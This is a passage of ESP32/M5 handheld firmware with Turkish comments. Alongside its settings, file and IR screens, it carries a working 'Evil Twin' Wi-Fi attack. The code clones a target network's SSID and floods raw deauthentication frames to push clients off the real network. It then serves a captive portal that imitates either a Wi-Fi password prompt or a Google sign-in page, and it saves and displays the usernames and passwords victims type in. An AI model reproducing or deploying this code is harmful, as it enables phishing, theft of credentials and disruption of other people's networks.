    M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();

    // Başlık
    M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(YELLOW);
    M5.Lcd.setCursor(4, 26);
    M5.Lcd.printf("Set Time  [%d/%02d]", field+1, 6);

    // Tarih satırı: YR  MO  DY
    // Saat satırı:  HH  MM  SS
    // textSize(2) = 12px geniş karakter
    for (int i = 0; i < 6; i++) {
      int col = i % 3;
      int row = i / 3;
      int x = 10 + col * 76;
      int y = 44 + row * 38;

      // Seçili alan: büyük yeşil kutu
      if (i == field) {
        M5.Lcd.fillRoundRect(x - 4, y - 2, 68, 34, 4, 0x0360); // koyu mavi arka plan
        M5.Lcd.setTextColor(GREEN);
      } else {
        M5.Lcd.setTextColor(0x7BEF); // açık gri
      }

      // Label
      M5.Lcd.setTextSize(1);
      M5.Lcd.setCursor(x, y);
      M5.Lcd.print(labels[i]);

      // Değer — büyük
      M5.Lcd.setTextSize(2);
      M5.Lcd.setCursor(x, y + 10);
      M5.Lcd.printf("%02d", vals[i]);
    }

    // Ok işaretleri — seçili alanın üst/altında
    {
      int col = field % 3;
      int row = field / 3;
      int ax = 10 + col * 76 + 20;
      int ay = 44 + row * 38;
      M5.Lcd.setTextColor(GREEN); M5.Lcd.setTextSize(1);
      M5.Lcd.setCursor(ax, ay - 8); M5.Lcd.print("^");
    }

    // Hint
    M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(0x3186);
    M5.Lcd.setCursor(4, 112);
    M5.Lcd.print("B:+  PWR:-  A:next  HoldA:save");
  };

  showSet();
  bool saving = false;
  while (!saving) {
    M5.update(); lastActivity = millis();
    if (M5.BtnB.wasPressed())   {
      vals[field] = (vals[field] < maxs[field]) ? vals[field]+1 : mins[field];
      showSet();
    }
    if (M5.BtnPWR.wasPressed()) {
      vals[field] = (vals[field] > mins[field]) ? vals[field]-1 : maxs[field];
      showSet();
    }
    if (M5.BtnA.wasPressed())   { field = (field + 1) % 6; showSet(); }
    if (M5.BtnA.wasHold())      { saving = true; }
    if (M5.BtnPWR.wasHold())    { lastActivity = millis(); return; } // kaydetmeden çık
    delay(30);
  }

  d.year  = vals[0] + 2000; d.month = vals[1]; d.date = vals[2];
  t.hours = vals[3]; t.minutes = vals[4]; t.seconds = vals[5];
  M5.Rtc.setDate(&d); M5.Rtc.setTime(&t);

  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  if (soundEnabled) beep(1047, 80);
  M5.Lcd.setTextSize(2); M5.Lcd.setTextColor(GREEN);
  int tw = M5.Lcd.textWidth("Saved!");
  M5.Lcd.setCursor((240-tw)/2, 62); M5.Lcd.print("Saved!");
  delay(1000);
  lastActivity = millis();
}
// ====================== EVIL TWIN ======================
void etShowNets(int n, int sel) {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(YELLOW);
  M5.Lcd.setCursor(4, 26); M5.Lcd.print("EVIL TWIN - hedef sec:");
  int perPage = 4, pageStart = (sel / perPage) * perPage;
  for (int i = pageStart; i < min(n, pageStart + perPage); i++) {
    if (i == sel) M5.Lcd.setTextColor(BLACK, GREEN);
    else M5.Lcd.setTextColor(WHITE);
    M5.Lcd.setCursor(4, 40 + (i - pageStart) * 19);
    String s = WiFi.SSID(i); if(s.length()>16) s=s.substring(0,15)+"~";
    M5.Lcd.printf("%-16s C%d", s.c_str(), WiFi.channel(i));
  }
  M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4, 120);
  M5.Lcd.print("B:dn PWR:up A:start HoldPWR:exit");
}

// Captive portal HTML - sahte WiFi şifre sayfası
const char PORTAL_HTML[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>WiFi Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:12px;padding:32px 28px;width:100%;max-width:380px;box-shadow:0 4px 20px rgba(0,0,0,.15)}
.logo{text-align:center;margin-bottom:24px}
.logo svg{width:48px;height:48px}
h2{text-align:center;font-size:18px;color:#333;margin-bottom:8px}
p{text-align:center;font-size:13px;color:#666;margin-bottom:24px}
label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:600}
input{width:100%;padding:12px 14px;border:1.5px solid #ddd;border-radius:8px;font-size:15px;outline:none;transition:.2s}
input:focus{border-color:#1a73e8}
button{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:18px}
button:hover{background:#1558b0}
.net{background:#f8f8f8;border:1px solid #eee;border-radius:8px;padding:10px 14px;margin-bottom:18px;font-size:13px;color:#444}
.lock{display:inline-block;margin-right:6px}
</style></head><body>
<div class='box'>
  <div class='logo'>
    <svg viewBox='0 0 24 24' fill='none' xmlns='http://www.w3.org/2000/svg'>
      <path d='M1.5 8.5C5.5 4.5 10.5 2.5 12 2.5s6.5 2 10.5 6' stroke='#1a73e8' stroke-width='2' stroke-linecap='round'/>
      <path d='M5 12c1.9-1.9 4.3-3 7-3s5.1 1.1 7 3' stroke='#1a73e8' stroke-width='2' stroke-linecap='round'/>
      <path d='M8.5 15.5c.9-.9 2.2-1.5 3.5-1.5s2.6.6 3.5 1.5' stroke='#1a73e8' stroke-width='2' stroke-linecap='round'/>
      <circle cx='12' cy='19' r='1.5' fill='#1a73e8'/>
    </svg>
  </div>
  <h2>WiFi Oturumu Gerekli</h2>
  <p>Bu ağa bağlanmak için kimliğinizi doğrulayın.</p>
  <div class='net'><span class='lock'>🔒</span><strong id='ssid'>__SSID__</strong></div>
  <form method='POST' action='/login'>
    <label>WiFi Şifresi</label>
    <input type='password' name='pass' placeholder='Şifrenizi girin' required autofocus>
    <button type='submit'>Bağlan</button>
  </form>
</div>
</body></html>
)rawhtml";

const char SUCCESS_HTML[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<meta http-equiv='refresh' content='3;url=http://google.com'>
<title>Bağlanıyor...</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;border-radius:12px;padding:40px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.15)}
.check{font-size:48px;margin-bottom:16px}
h2{color:#34a853;margin-bottom:8px}
p{color:#666;font-size:14px}
</style></head><body>
<div class='box'>
  <div class='check'>✓</div>
  <h2>Bağlandı!</h2>
  <p>İnternet bağlantısı kuruldu.<br>Yönlendiriliyorsunuz...</p>
</div>
</body></html>
)rawhtml";

const char GOOGLE_HTML[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Google</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding-top:48px}
.logo{margin-bottom:28px}
.logo svg{width:92px;height:30px}
.card{width:100%;max-width:400px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
h1{font-size:24px;color:#202124;text-align:center;margin-bottom:8px;font-weight:400}
p{text-align:center;font-size:14px;color:#202124;margin-bottom:32px}
.input-wrap{position:relative;margin-bottom:28px}
input{width:100%;padding:13px 16px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:.2s;color:#202124}
input:focus{border-color:#1a73e8;border-width:2px}
label{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:16px;color:#5f6368;pointer-events:none;transition:.15s;background:#fff;padding:0 4px}
input:focus~label,input:not(:placeholder-shown)~label{top:-1px;font-size:11px;color:#1a73e8}
.forgot{font-size:14px;color:#1a73e8;text-decoration:none;display:block;margin-bottom:28px}
.forgot:hover{text-decoration:underline}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{font-size:14px;color:#1a73e8;text-decoration:none}
.create:hover{text-decoration:underline}
button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px}
button:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
</style></head><body>
<div class='logo'>
<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 272 92'>
<path fill='#EA4335' d='M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/>
<path fill='#FBBC05' d='M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z'/>
<path fill='#4285F4' d='M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.6-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.12 7.87 7.27 0 11.8-4.49 11.8-12.9v-3.16h-.34c-2.18 2.69-6.38 5.04-11.69 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.3 0 9.5 2.35 11.69 4.96h.34v-3.77h9.28zm-8.56 20.92c0-7.81-5.21-13.52-11.85-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.64 0 11.85-5.63 11.85-13.36z'/>
<path fill='#EA4335' d='M225 3v65h-9.5V3h9.5z'/>
<path fill='#34A853' d='M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z'/>
<path fill='#4285F4' d='M35.29 41.41V32h31.1c.32 1.64.49 3.58.49 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.03 9.66C16.32 69.35.36 53.89.36 35.29.36 16.69 16.32 1.23 34.61 1.23c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.5-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.67l-22.49.02v.25z'/>
</svg>
</div>
<div class='card'>
  <h1>Oturum açın</h1>
  <p>Google Hesabınızı kullanın</p>
  <form method='POST' action='/login'>
    <div class='input-wrap'>
      <input type='email' name='user' placeholder=' ' required id='email'>
      <label for='email'>E-posta veya telefon</label>
    </div>
    <div class='input-wrap'>
      <input type='password' name='pass' placeholder=' ' required id='pass'>
      <label for='pass'>Şifre</label>
    </div>
    <a href='#' class='forgot'>Şifremi unuttum</a>
    <div class='actions'>
      <a href='#' class='create'>Hesap oluşturun</a>
      <button type='submit'>İleri</button>
    </div>
  </form>
</div>
</body></html>
)rawhtml";
WebServer  webServer(80);
DNSServer  dnsServer;
String     capturedPass = "";
bool       newCapture   = false;
char       portalSSID[33] = "";

void setupPortal(const char* ssid, int portalType) {
  strncpy(portalSSID, ssid, 32); portalSSID[32]=0;

  String html;
  if (portalType == 1) {
    // Google login
    html = String(GOOGLE_HTML);
  } else {
    // WiFi şifre sayfası
    html = String(PORTAL_HTML);
    html.replace("__SSID__", String(ssid));
  }

  webServer.onNotFound([html]() {
    webServer.send(200, "text/html; charset=utf-8", html);
  });
  webServer.on("/", HTTP_GET, [html]() {
    webServer.send(200, "text/html; charset=utf-8", html);
  });
  webServer.on("/login", HTTP_POST, []() {
    if (webServer.hasArg("pass")) {
      capturedPass = webServer.arg("pass");
      // Google'da user da var
      String user = webServer.hasArg("user") ? webServer.arg("user") : "";
      newCapture = true;
      if (LittleFS.begin(false)) {
        File f = LittleFS.open("/captured.txt", FILE_APPEND);
        if (f) {
          if (user.length() > 0)
            f.printf("SSID:%s USER:%s PASS:%s\n", portalSSID, user.c_str(), capturedPass.c_str());
          else
            f.printf("SSID:%s PASS:%s\n", portalSSID, capturedPass.c_str());
          f.close();
        }
      }
    }
    webServer.send(200, "text/html; charset=utf-8", String(SUCCESS_HTML));
  });
  webServer.begin();
  dnsServer.start(53, "*", IPAddress(192,168,4,1));
}

void evilTwin(int portalType) {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextColor(CYAN); M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(4, 45); M5.Lcd.println("Scanning...");
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  int n = WiFi.scanNetworks();
  if (n == 0) {
    M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4,55); M5.Lcd.println("No networks!");
    delay(2000); lastActivity = millis(); return;
  }

  int selIdx = 0;
  etShowNets(n, selIdx);
  bool selected = false;
  while (!selected) {
    M5.update(); lastActivity = millis();
    if (M5.BtnB.wasPressed())   { selIdx=(selIdx+1)%n;     etShowNets(n,selIdx); }
    if (M5.BtnPWR.wasPressed()) { selIdx=(selIdx-1+n)%n;   etShowNets(n,selIdx); }
    if (M5.BtnA.wasPressed())   selected = true;
    if (M5.BtnPWR.wasHold())    { lastActivity = millis(); return; } // çıkış
    delay(30);
  }

  char targetSSID[33]; strncpy(targetSSID, WiFi.SSID(selIdx).c_str(), 32); targetSSID[32]=0;
  int  targetCh = WiFi.channel(selIdx);
  uint8_t targetBSSID[6]; memcpy(targetBSSID, WiFi.BSSID(selIdx), 6);

  // AP + STA: sahte AP + deauth
  capturedPass = "";
  newCapture   = false;
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(targetSSID, "", targetCh, 0);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(targetCh, WIFI_SECOND_CHAN_NONE);

  setupPortal(targetSSID, portalType);

  uint8_t pkt[26] = {
    0xC0,0x00, 0x00,0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00, 0x07,0x00
  };
  memcpy(&pkt[10], targetBSSID, 6);
  memcpy(&pkt[16], targetBSSID, 6);

  bool running = true;
  unsigned long lastDraw = 0;
  int deauthSent = 0;

  while (running) {
    M5.update(); lastActivity = millis();
    dnsServer.processNextRequest();
    webServer.handleClient();

    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    deauthSent++;

    if (millis() - lastDraw > 400) {
      lastDraw = millis();
      M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
      M5.Lcd.setTextWrap(false);
      M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(YELLOW);
      M5.Lcd.setCursor(4, 26); M5.Lcd.print(portalType==1 ? "[ET] Google" : "[ET] WiFi PW");
      M5.Lcd.setTextColor(WHITE);
      char ssidShort[27]; strncpy(ssidShort, targetSSID, 26); ssidShort[26]=0;
      M5.Lcd.setCursor(4, 40); M5.Lcd.printf("%.26s", ssidShort);
      M5.Lcd.setCursor(4, 54); M5.Lcd.printf("CH:%d  Cli:%d", targetCh, WiFi.softAPgetStationNum());
      M5.Lcd.setCursor(4, 68); M5.Lcd.printf("Dth:%d", deauthSent);
      if (newCapture) {
        M5.Lcd.setTextColor(GREEN);
        M5.Lcd.setCursor(4, 82); M5.Lcd.print(">> CAPTURED! <<");
        char pwShort[27]; strncpy(pwShort, capturedPass.c_str(), 26); pwShort[26]=0;
        M5.Lcd.setCursor(4, 96); M5.Lcd.printf("%.26s", pwShort);
      } else {
        M5.Lcd.setTextColor(0x4208);
        M5.Lcd.setCursor(4, 82); M5.Lcd.print("Waiting for victim...");
      }
      M5.Lcd.setTextColor(0x3186);
      M5.Lcd.setCursor(4, 110); M5.Lcd.print("A: stop");
      M5.Lcd.setTextWrap(true);
    }
    if (M5.BtnA.wasPressed()) running = false;
    delay(5);
  }

  webServer.stop();
  dnsServer.stop();
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  lastActivity = millis();
}

// ====================== RAW IR (kütüphanesiz) ======================
void irMark(uint16_t us) {
  // 38kHz carrier: ~13µs HIGH + 13µs LOW
  uint16_t cycles = us / 26;
  for (uint16_t i = 0; i < cycles; i++) {
    digitalWrite(IR_PIN, HIGH);
    delayMicroseconds(13);
    digitalWrite(IR_PIN, LOW);
    delayMicroseconds(13);
  }
}
void irSpace(uint16_t us) { digitalWrite(IR_PIN, LOW); delayMicroseconds(us); }

void sendNEC(uint32_t code) {
  irMark(9000); irSpace(4500);
  for (int i = 0; i < 32; i++) {
    irMark(562);
    irSpace((code >> i) & 1 ? 1688 : 562);
  }
  irMark(562); irSpace(40000);
}

// ====================== TV-B Gone ======================
// Popüler TV markalarının NEC Power kodları
void tvBGone() {
  pinMode(IR_PIN, OUTPUT);
  digitalWrite(IR_PIN, LOW);

  struct { uint32_t code; const char* brand; } tvCodes[] = {
    { 0xE0E040BF, "Samsung"   },
    { 0x20DF10EF, "LG"        },
    { 0x10AF02FD, "Sharp"     },
    { 0x400401FB, "Philips"   },
    { 0x00FFE01F, "Vizio"     },
    { 0x80BF02FD, "Hisense"   },
    { 0x807F8877, "TCL"       },
    { 0xC1AA09F6, "Toshiba"   },
    { 0x00FF02FD, "Sanyo"     },
    { 0x0000000C, "Sony NEC"  },
    { 0x08F740BF, "JVC"       },
    { 0x57E3EE11, "Panasonic" },
    // Türk / Avrupa markaları
    { 0x5EA1F00F, "Vestel"    },
    { 0x5EA1F807, "Finlux"    },
    { 0x5EA1B04F, "Arcelik"   },
    { 0x5EA1D02F, "Beko"      },
    { 0x5EA13C43, "Grundig"   },
    { 0x5EA1609F, "Profilo"   },
    { 0x5EA1A05F, "Regal"     },
    { 0x5EA1700F, "SEG"       },
  };
  int codeCount = 20;

  bool running = true;
  int cur = 0;
  unsigned long lastDraw = 0;
  int sentCount = 0;

  while (running) {
    M5.update(); lastActivity = millis();

    // Gönder
    sendNEC(tvCodes[cur].code);
    delay(100); // markalar arası bekleme
    sentCount++;
    cur = (cur + 1) % codeCount;

    if (millis() - lastDraw > 250) {
      lastDraw = millis();
      M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
      M5.Lcd.setTextSize(2); M5.Lcd.setTextColor(RED);
      M5.Lcd.setCursor(4, 28); M5.Lcd.print("TV-B GONE");
      M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(WHITE);
      M5.Lcd.setCursor(4, 54); M5.Lcd.printf("Sent  : %d", sentCount);
      M5.Lcd.setCursor(4, 68); M5.Lcd.printf("Brand : %s", tvCodes[cur].brand);
      M5.Lcd.setCursor(4, 82); M5.Lcd.printf("Code  : 0x%08X", tvCodes[cur].code);
      M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4, 104); M5.Lcd.print("A: stop");
    }
    if (M5.BtnA.wasPressed()) running = false;
  }
  lastActivity = millis();
}

// ====================== FILES ======================
void littleFSList() {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(CYAN);
  M5.Lcd.setCursor(4, 28); M5.Lcd.print("LittleFS files:");

  if (!LittleFS.begin(true)) {
    M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4, 50); M5.Lcd.print("Mount failed!");
    delay(2000); lastActivity = millis(); return;
  }

  File root = LittleFS.open("/");
  int y = 42; int count = 0;
  M5.Lcd.setTextColor(WHITE);
  while (true) {
    File f = root.openNextFile();
    if (!f) break;
    if (y < 118) {
      M5.Lcd.setCursor(4, y);
      M5.Lcd.printf("%-20s %dB", f.name(), f.size());
      y += 12;
    }
    count++;
    f.close();
  }
  if (count == 0) { M5.Lcd.setCursor(4, 50); M5.Lcd.setTextColor(YELLOW); M5.Lcd.print("(empty)"); }
  M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4, 124); M5.Lcd.print("A: exit");
  bool ex = false;
  while (!ex) { M5.update(); lastActivity = millis(); if (M5.BtnA.wasPressed()) ex = true; delay(30); }
  LittleFS.end();
  lastActivity = millis();
}

void littleFSInfo() {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(CYAN);
  M5.Lcd.setCursor(4, 28); M5.Lcd.print("LittleFS Info:");

  if (!LittleFS.begin(true)) {
    M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4, 50); M5.Lcd.print("Mount failed!");
    delay(2000); lastActivity = millis(); return;
  }

  size_t total = LittleFS.totalBytes();
  size_t used  = LittleFS.usedBytes();
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.setCursor(4, 48); M5.Lcd.printf("Total : %d KB", total/1024);
  M5.Lcd.setCursor(4, 62); M5.Lcd.printf("Used  : %d KB", used/1024);
  M5.Lcd.setCursor(4, 76); M5.Lcd.printf("Free  : %d KB", (total-used)/1024);

  int barW = (total > 0) ? (used * 200 / total) : 0;
  M5.Lcd.fillRect(20, 92, 200, 12, 0x2104);
  M5.Lcd.fillRect(20, 92, barW, 12, (barW > 160 ? RED : GREEN));

  M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4, 112); M5.Lcd.print("A: exit");
  bool ex = false;
  while (!ex) { M5.update(); lastActivity = millis(); if (M5.BtnA.wasPressed()) ex = true; delay(30); }
  LittleFS.end();
  lastActivity = millis();
}

void capturedPws() {
  M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
  M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(CYAN);
  M5.Lcd.setCursor(4, 28); M5.Lcd.print("Captured Passwords:");

  if (!LittleFS.begin(false)) {
    M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4,50); M5.Lcd.print("LittleFS mount failed!");
    delay(2000); lastActivity = millis(); return;
  }

  File f = LittleFS.open("/captured.txt", FILE_READ);
  if (!f || f.size() == 0) {
    M5.Lcd.setTextColor(YELLOW); M5.Lcd.setCursor(4,50); M5.Lcd.print("No captures yet.");
    if (f) f.close();
    M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4,110); M5.Lcd.print("A: exit");
    bool ex=false;
    while(!ex){M5.update();lastActivity=millis();if(M5.BtnA.wasPressed())ex=true;delay(30);}
    LittleFS.end(); lastActivity=millis(); return;
  }

  // Satırları oku, scroll ile göster
  String lines[30]; int lineCount = 0;
  while (f.available() && lineCount < 30) {
    String l = f.readStringUntil('\n');
    l.trim();
    if (l.length() > 0) lines[lineCount++] = l;
  }
  f.close();

  int offset = 0;
  int perPage = 4;
  bool ex = false;
  auto showPws = [&]() {
    M5.Lcd.fillRect(0, 22, 240, 113, BLACK); drawStatusBar();
    M5.Lcd.setTextWrap(false);
    M5.Lcd.setTextSize(1); M5.Lcd.setTextColor(CYAN);
    M5.Lcd.setCursor(4, 26); M5.Lcd.printf("Captured PWs (%d):", lineCount);
    for (int i = offset; i < min(lineCount, offset+perPage); i++) {
      M5.Lcd.setTextColor(GREEN);
      M5.Lcd.setCursor(4, 40 + (i-offset)*18);
      // Her satırı 28 karaktere kes
      char buf[29]; strncpy(buf, lines[i].c_str(), 28); buf[28]=0;
      M5.Lcd.print(buf);
    }
    M5.Lcd.setTextColor(0x3186); M5.Lcd.setCursor(4,120);
    M5.Lcd.print("B:dn PWR:up A:exit HoldB:clr");
    M5.Lcd.setTextWrap(true);
  };
  showPws();
  while (!ex) {
    M5.update(); lastActivity = millis();
    if (M5.BtnB.wasPressed()) { if(offset+perPage<lineCount) offset+=perPage; showPws(); }
    if (M5.BtnPWR.wasPressed()) { if(offset>0) offset-=perPage; showPws(); }
    if (M5.BtnA.wasPressed()) ex = true;
    if (M5.BtnB.wasHold()) {
      // Tümünü sil
      LittleFS.remove("/captured.txt");
      M5.Lcd.fillRect(0,22,240,113,BLACK); drawStatusBar();
      M5.Lcd.setTextColor(RED); M5.Lcd.setCursor(4,60); M5.Lcd.print("Cleared!");
      delay(1200); ex=true;
    }
    delay(30);
  }
  LittleFS.end();
  lastActivity = millis();
}

void sdList() { comingSoon(); }
void sdInfo()  { comingSoon(); }
// ====================================================================

void executeSubAction() {
  // index 0 = Back → ana menüye dön
  if(subMenuIndex == 0){
    inSubMenu = false;
    subMenuIndex = 0;
    drawMenu();
    return;
  }
  if(activeSub == 0 && subMenuIndex == 1){ // Connect WiFi
    connectWifi();
  } else if(activeSub == 0 && subMenuIndex == 2){ // WiFi Scan
    M5.Lcd.fillScreen(BLACK);
    drawStatusBar();
    M5.Lcd.setTextColor(CYAN);
    M5.Lcd.setTextSize(1);
    M5.Lcd.setCursor(0,30);
    M5.Lcd.println("Scanning WiFi...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    int n = WiFi.scanNetworks();

    // ---- SCROLL DESTEKLİ WiFi LİSTESİ ----
    int wifiOffset  = 0;
    int wifiPerPage = 3;
    bool wifiExit   = false;

    auto showWifi = [&](){
      M5.Lcd.fillRect(0, 22, 240, 113, BLACK);
      drawStatusBar();
      M5.Lcd.setTextColor(CYAN);
      M5.Lcd.setTextSize(1);
      if(n == 0){
        M5.Lcd.setCursor(10, 60);
        M5.Lcd.println("No networks found");
      } else {
        for(int i = wifiOffset; i < min(n, wifiOffset + wifiPerPage); i++){
          M5.Lcd.setCursor(2, 28 + (i - wifiOffset) * 28);
          M5.Lcd.printf("%d:%s\n   %ddBm", i+1, WiFi.SSID(i).c_str(), WiFi.RSSI(i));
        }
      }
      M5.Lcd.setTextColor(0x4208);
      M5.Lcd.setCursor(2, 124);
      M5.Lcd.print("B:down  PWR:up  A:exit");
    };

    showWifi();

    while(!wifiExit){
      M5.update();
      lastActivity = millis(); // uykuya geçme
      if(M5.BtnB.wasPressed()){
        if(wifiOffset + wifiPerPage < n) wifiOffset += wifiPerPage;
        else wifiOffset = 0;
        showWifi();
      }
      if(M5.BtnPWR.wasPressed()){
        if(wifiOffset - wifiPerPage >= 0) wifiOffset -= wifiPerPage;
        else wifiOffset = ((n - 1) / wifiPerPage) * wifiPerPage;
        showWifi();
      }
      if(M5.BtnA.wasPressed()){
        wifiExit = true;
      }
      delay(30);
    }
    lastActivity = millis(); // çıkışta uykuya girmesin
    // ----------------------------------------

  } else if(activeSub == 0 && subMenuIndex == 3){ // Target Attack
    targetAttack();
  } else if(activeSub == 0 && subMenuIndex == 4){ // Deauth Flood
    deauthFlood();
  } else if(activeSub == 0 && subMenuIndex == 5){ // Beacon Spam
    beaconSpam();
  } else if(activeSub == 0 && subMenuIndex == 6){ // Evil Twin → submenü aç
    inSubMenu = false; // önce kapat ki evilTwinSubMenu tekrar açsın
    evilTwinSubMenu();
    return; // executeSubAction'ın drawMenu() çağırmasını engelle
  } else if(activeSub == 5 && subMenuIndex == 1){ // WiFi Password portal
    evilTwin(0);
  } else if(activeSub == 5 && subMenuIndex == 2){ // Google Login portal
    evilTwin(1);
  } else if(activeSub == 2 && subMenuIndex == 1){ // Brightness
    settingsBrightness();
  } else if(activeSub == 2 && subMenuIndex == 2){ // Sound
    settingsSound();
  } else if(activeSub == 2 && subMenuIndex == 3){ // Sleep Timer
    settingsSleepTimer();
  } else if(activeSub == 2 && subMenuIndex == 4){ // Set Time
    settingsSetTime();
  } else if(activeSub == 2 && subMenuIndex == 5){ // About
    settingsAbout();
  // ---- IR ----
  } else if(activeSub == 3 && subMenuIndex == 1){ // TV-B Gone
    tvBGone();
  } else if(activeSub == 3 && subMenuIndex == 2){ // IR Read
    comingSoon();
  } else if(activeSub == 3 && subMenuIndex == 3){ // Custom IR
    comingSoon();
  // ---- Files ----
  } else if(activeSub == 4 && subMenuIndex == 1){ // LittleFS List
    littleFSList();
  } else if(activeSub == 4 && subMenuIndex == 2){ // LittleFS Info
    littleFSInfo();
  } else if(activeSub == 4 && subMenuIndex == 3){ // Captured PWs
    capturedPws();
  } else if(activeSub == 4 && subMenuIndex == 4){ // SD Info
    sdInfo();
  } else {
    comingSoon();
  }
  inSubMenu = false;
  drawMenu();
}

void wifiSubMenu()     { activeSub = 0; subMenuIndex = 0; inSubMenu = true; drawSubMenu(); }
void bleSubMenu()      { activeSub = 1; subMenuIndex = 0; inSubMenu = true; drawSubMenu(); }
void settingsSubMenu() { activeSub = 2; subMenuIndex = 0; inSubMenu = true; drawSubMenu(); }
void irSubMenu()       { activeSub = 3; subMenuIndex = 0; inSubMenu = true; drawSubMenu(); }
void filesSubMenu()    { activeSub = 4; subMenuIndex = 0; inSubMenu = true; drawSubMenu(); }
void evilTwinSubMenu() { activeSub = 5; subMenuIndex = 0; inSubMenu = true; drawSubMenu(); }

// ====================== BUZZER ======================
void beep(int freq, int dur) {
  if (!soundEnabled) return;
  tone(BUZZ_PIN, freq, dur);
  delay(dur + 20);
}

void bootMelody() {
  if (!soundEnabled) return;
  beep(880, 80);
  beep(1047, 80);
  beep(1319, 80);
  beep(1568, 120);
  delay(60);
  beep(1319, 60);
  beep(1568, 200);
